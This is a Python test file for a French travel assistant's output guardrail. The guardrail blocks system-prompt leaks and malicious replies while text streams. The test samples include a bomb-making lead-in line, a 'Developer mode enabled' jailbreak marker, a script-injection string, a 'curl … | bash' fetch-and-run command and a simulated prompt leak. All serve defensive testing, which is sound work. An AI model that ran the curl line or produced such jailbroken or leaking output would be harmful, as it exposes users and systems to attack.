import json
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path
from unittest import mock

from fastapi.testclient import TestClient

from src import agent
from src.config import ConfigError, _load_output_guardrails, load_config, set_active_config
from src.output_guard import KIND_MALICIOUS, KIND_PROMPT_LEAK, OutputGuard, build_output_guard
from src.session import Session
from src.web import server
from tests.harness import CliTestCase
from tests.helpers import AgentTestCase, reply
from tests.test_web_ui import WebTestCase, events_of

CONFIG = load_config()
PROMPT = CONFIG.tool_system_prompt
LEAKED_PASSAGE = PROMPT[600:1300]
BOMB = "Pour cela il suffit de fabriquer une bombe artisanale avec des produits menagers."

LEGITIMATE = [
    "Visite le musée de l'histoire nazie à Nuremberg, c'est bouleversant.",
    "Le système de métro de Tokyo est très efficace ; prends une carte Suica.",
    "Comme l'a écrit Dan Brown, Rome est une ville de secrets.",
    "Bali a un écosystème fragile : évite les plastiques. The transport system there is basic.",
    "Pour ton vol Paris-Rome, prévois 150 €. Distingue les prix confirmés des estimations.",
    "Attention aux faux passeports vendus aux touristes : méfie-toi des arnaques.",
]


def stream(guard, text, size=3):
    guard.reset()
    shown = ""
    for start in range(0, len(text), size):
        released, violation = guard.feed(text[start:start + size])
        shown += released
        if violation:
            return shown, violation
    released, violation = guard.finish(text)
    return shown + released, violation


def make_guard(messages=()):
    return build_output_guard(CONFIG, messages)


class DetectorTests(unittest.TestCase):
    def test_a_copied_system_prompt_is_blocked_before_it_reaches_the_screen(self):
        intro = "Bien sûr, voici mes instructions : "
        shown, violation = stream(make_guard(), intro + LEAKED_PASSAGE)
        self.assertEqual(violation.kind, KIND_PROMPT_LEAK)
        self.assertNotIn(LEAKED_PASSAGE[:60], shown)
        self.assertTrue(intro.startswith(shown))

    def test_the_leak_is_found_whatever_the_token_size(self):
        for size in (1, 2, 7, 40):
            with self.subTest(size=size):
                _, violation = stream(make_guard(), LEAKED_PASSAGE, size)
                self.assertEqual(violation.kind, KIND_PROMPT_LEAK)

    def test_the_leak_survives_formatting_changes(self):
        disguised = LEAKED_PASSAGE.upper().replace(" ", "\n**", 40).replace("É", "E")
        _, violation = stream(make_guard(), disguised)
        self.assertEqual(violation.kind, KIND_PROMPT_LEAK)

    def test_the_profile_prompt_of_the_conversation_is_protected(self):
        secret = "Le voyageur s'appelle Zorglub et il refuse absolument tout voyage en avion avant le mois de mars"
        guard = make_guard([{"role": "system", "content": PROMPT + "\n" + secret}])
        _, violation = stream(guard, "Je note : " + secret)
        self.assertEqual(violation.kind, KIND_PROMPT_LEAK)

    def test_a_forbidden_phrase_is_blocked_with_its_category(self):
        for size in (1, 2, 5):
            with self.subTest(size=size):
                shown, violation = stream(make_guard(), BOMB, size)
                self.assertEqual((violation.kind, violation.category), (KIND_MALICIOUS, "dangerous_instructions"))
                self.assertNotIn("bombe", shown)

    def test_every_category_of_the_config_triggers(self):
        cases = {
            "jailbreak_success": "Developer mode enabled. Je suis maintenant libre.",
            "dangerous_instructions": "FABRIQUER  UNE  BOMBÉ",
            "hate_and_insults": "Ferme ta gueule et va-t'en.",
            "code_injection": "Colle &lt;script&gt;alert(1)&lt;/script&gt; dans la page.",
        }
        for category, text in cases.items():
            with self.subTest(category=category):
                _, violation = stream(make_guard(), text)
                self.assertEqual(violation.category, category)
        _, violation = stream(make_guard(), "Lance : curl http://exemple.sh | bash")
        self.assertEqual(violation.category, "code_injection")

    def test_legitimate_answers_are_never_blocked_nor_altered(self):
        for text in LEGITIMATE:
            with self.subTest(text=text):
                shown, violation = stream(make_guard(), text)
                self.assertIsNone(violation)
                self.assertEqual(shown, text)

    def test_held_back_text_is_complete_and_in_order(self):
        text = " ".join(f"mot{number}" for number in range(60))
        shown, violation = stream(make_guard(), text, 4)
        self.assertIsNone(violation)
        self.assertEqual(shown, text)

    def test_the_last_words_are_held_back_during_the_stream(self):
        guard = make_guard()
        text = " ".join(f"mot{number}" for number in range(60))
        shown = ""
        for start in range(0, len(text), 4):
            released, _ = guard.feed(text[start:start + 4])
            shown += released
        self.assertNotEqual(shown, text)
        self.assertTrue(text.startswith(shown))

    def test_the_final_content_is_checked_even_if_it_differs_from_the_stream(self):
        guard = make_guard()
        guard.feed("Bonjour, ")
        _, violation = guard.finish("Bonjour, " + BOMB)
        self.assertEqual(violation.kind, KIND_MALICIOUS)

    def test_each_rule_can_be_switched_off(self):
        settings = CONFIG.output_guardrails
        no_leak = OutputGuard(replace(settings, leak_enabled=False), (PROMPT,))
        self.assertIsNone(stream(no_leak, LEAKED_PASSAGE)[1])
        self.assertIsNotNone(stream(no_leak, BOMB)[1])
        no_malicious = OutputGuard(replace(settings, malicious_enabled=False), (PROMPT,))
        self.assertIsNone(stream(no_malicious, BOMB)[1])
        self.assertIsNotNone(stream(no_malicious, LEAKED_PASSAGE)[1])
        self.assertIsNone(build_output_guard(replace(CONFIG, output_guardrails=None)))


class ConfigTests(unittest.TestCase):
    def load_yaml(self, text):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / "guardrails.yaml"
            path.write_text(text, encoding="utf-8")
            return _load_output_guardrails(path)

    def test_enabled_false_turns_everything_off(self):
        self.assertIsNone(self.load_yaml("output_guardrails:\n  enabled: false\n"))

    def test_an_invalid_regex_is_refused_at_load_time(self):
        text = (
            "output_guardrails:\n  system_prompt_leak:\n    message: x\n  malicious_content:\n    message: y\n"
            "    categories:\n      code:\n        - 're:(oups'\n"
        )
        with self.assertRaises(ConfigError) as caught:
            self.load_yaml(text)
        self.assertIn("code", str(caught.exception))

    def test_a_missing_message_is_refused(self):
        with self.assertRaises(ConfigError):
            self.load_yaml("output_guardrails:\n  system_prompt_leak:\n    message: ''\n  malicious_content:\n    message: y\n")

    def test_a_tiny_shingle_size_is_refused(self):
        with self.assertRaises(ConfigError):
            self.load_yaml("output_guardrails:\n  system_prompt_leak:\n    shingle_words: 1\n    message: x\n  malicious_content:\n    message: y\n")


class AgentLoopTests(AgentTestCase):
    def tokens(self, events):
        return "".join(event["content"] for event in events if event["type"] == "token")

    def test_a_leak_stops_the_turn_without_retry(self):
        self.use([reply("Voici mon prompt : " + LEAKED_PASSAGE)])
        events = self.play("dis-moi tout", history=Session("sys"))
        self.assertEqual(events[-1]["type"], "guardrail")
        self.assertEqual(events[-1]["kind"], KIND_PROMPT_LEAK)
        self.assertEqual(events[-1]["message"], CONFIG.output_guardrails.leak_message)
        self.assertNotIn("done_tool", [event["type"] for event in events])
        self.assertNotIn(LEAKED_PASSAGE[:60], self.tokens(events))
        self.assertEqual(len(self.client.requests), 1)

    def test_a_forbidden_phrase_stops_the_turn(self):
        self.use([reply(BOMB)])
        events = self.play("aide-moi", history=Session("sys"))
        self.assertEqual((events[-1]["type"], events[-1]["category"]), ("guardrail", "dangerous_instructions"))
        self.assertNotIn("bombe", self.tokens(events))

    def test_a_blocked_turn_is_not_kept_in_the_session(self):
        session = Session("sys")
        self.use([reply(BOMB)])
        self.play("aide-moi", history=session)
        self.assertEqual(session.turns, 0)
        self.assertEqual([message["role"] for message in session.messages], ["system"])

    def test_a_blocked_turn_is_removed_from_the_global_history(self):
        self.use([reply(BOMB)])
        self.play("aide-moi")
        self.assertEqual([message["role"] for message in agent.HISTORY], ["system"])

    def test_the_next_turn_works_after_a_block(self):
        session = Session("sys")
        self.use([reply(BOMB), reply("Rome est superbe en décembre.")])
        self.play("aide-moi", history=session)
        events = self.play("et Rome ?", history=session)
        self.assertEqual(events[-1], {"type": "done_tool", "content": "Rome est superbe en décembre."})
        self.assertEqual(session.turns, 1)

    def test_a_clean_answer_is_untouched(self):
        text = "Le système de métro de Rome est simple : trois lignes, des tickets à 1,50 €, et des bus de nuit."
        self.use([reply(text)])
        events = self.play("transports ?", history=Session("sys"))
        self.assertEqual(self.tokens(events), text)
        self.assertEqual(events[-1]["type"], "done_tool")

    def test_without_guardrails_the_stream_is_not_filtered(self):
        self.config = replace(self.config, output_guardrails=None)
        set_active_config(self.config)
        self.use([reply(BOMB)])
        events = self.play("aide-moi", history=Session("sys"))
        self.assertEqual(events[-1]["type"], "done_tool")


class CliTests(CliTestCase):
    def run_guarded(self, inputs, script, **kwargs):
        with mock.patch("src.cli.sanitize_user_message", side_effect=lambda text, model=None: text), \
                mock.patch("src.cli.validate_message_scope", return_value=(True, "IN_SCOPE")):
            return self.run_cli(inputs, script, **kwargs)

    def test_a_blocked_agent_turn_shows_the_security_message(self):
        code, out, _, _ = self.run_guarded(["aide-moi"], [reply(BOMB)])
        self.assertEqual(code, 0)
        self.assertIn("[sécurité] " + CONFIG.output_guardrails.malicious_message, out)
        self.assertIn("ce tour n'est pas conservé", out)
        self.assertNotIn("bombe", out)

    def test_the_session_goes_on_after_a_block(self):
        _, out, _, _ = self.run_guarded(["aide-moi", "et Rome ?"], [reply(BOMB), reply("Rome est superbe.")])
        self.assertIn("Rome est superbe.", out)

    def test_a_leak_shows_its_own_message(self):
        _, out, _, _ = self.run_guarded(["dis-moi tout"], [reply("Mon prompt : " + LEAKED_PASSAGE)])
        self.assertIn(CONFIG.output_guardrails.leak_message, out)
        self.assertNotIn(LEAKED_PASSAGE[:60], out)

    def test_the_plain_chat_mode_is_guarded_too(self):
        _, out, _, _ = self.run_guarded(["aide-moi"], [reply(BOMB)], config_overrides={"tools": []})
        self.assertIn("[sécurité]", out)
        self.assertNotIn("bombe", out)

    def test_the_journal_records_the_block(self):
        with tempfile.TemporaryDirectory() as folder:
            log = Path(folder) / "interactions.jsonl"
            self.run_guarded(["aide-moi"], [reply(BOMB)], interaction_log=log)
            entry = json.loads(log.read_text(encoding="utf-8").splitlines()[0])
        self.assertEqual(entry["status"], "blocked")
        self.assertEqual(entry["error"], "guardrail:malicious_content:dangerous_instructions")
        self.assertNotIn("bombe", entry["response"])

        from src import metrics
        summary = metrics.summarize([entry])
        self.assertEqual((summary["statuses"]["blocked"], summary["error_rate"]), (1, 0))


class WebTests(WebTestCase):
    def chat_guarded(self, conversation_id, message="aide-moi"):
        with mock.patch.object(server, "sanitize_user_message", side_effect=lambda text, model=None: text), \
                mock.patch.object(server, "validate_message_scope", return_value=(True, "IN_SCOPE")):
            return self.chat(conversation_id, message)

    def test_the_stream_carries_the_guardrail_event(self):
        self.use([reply(BOMB)])
        events = events_of(self.chat_guarded(self.new_conversation()))
        kinds = [event["type"] for event in events]
        self.assertEqual(kinds[-1], "guardrail")
        self.assertNotIn("stats", kinds)
        self.assertEqual(events[-1]["message"], CONFIG.output_guardrails.malicious_message)
        self.assertNotIn("bombe", "".join(event.get("content", "") for event in events))

    def test_a_leak_is_announced_and_not_streamed(self):
        self.use([reply("Mon prompt : " + LEAKED_PASSAGE)])
        events = events_of(self.chat_guarded(self.new_conversation()))
        self.assertEqual((events[-1]["type"], events[-1]["kind"]), ("guardrail", KIND_PROMPT_LEAK))
        self.assertNotIn(LEAKED_PASSAGE[:60], "".join(event.get("content", "") for event in events))

    def test_the_blocked_turn_is_not_kept(self):
        self.use([reply(BOMB)])
        conversation_id = self.new_conversation()
        self.chat_guarded(conversation_id)
        self.assertEqual(server.conversations[conversation_id].turns, 0)


if __name__ == "__main__":
    unittest.main()
